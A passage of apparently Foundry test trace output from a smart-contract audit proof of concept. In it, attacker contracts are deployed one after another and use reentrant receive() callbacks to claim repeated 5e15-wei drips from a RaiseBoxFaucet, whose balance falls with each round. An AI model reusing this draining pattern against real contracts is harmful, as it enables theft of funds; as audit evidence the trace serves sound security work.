    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 700000000000000000 [7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xAB722fDA4f4023cE2D341761E0B77CA0Bb5748Ce
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 60) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7794183] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7793424] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7757256] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7749598] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 695000000000000000 [6.95e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x0De708A3727f0545E82b0a357cF62bf64FAD84Fd
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 61) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7492214] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7491455] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7455287] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7447629] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 690000000000000000 [6.9e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xe722e87777cf68EF94b6f80e2aD3AfB184e51f67
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
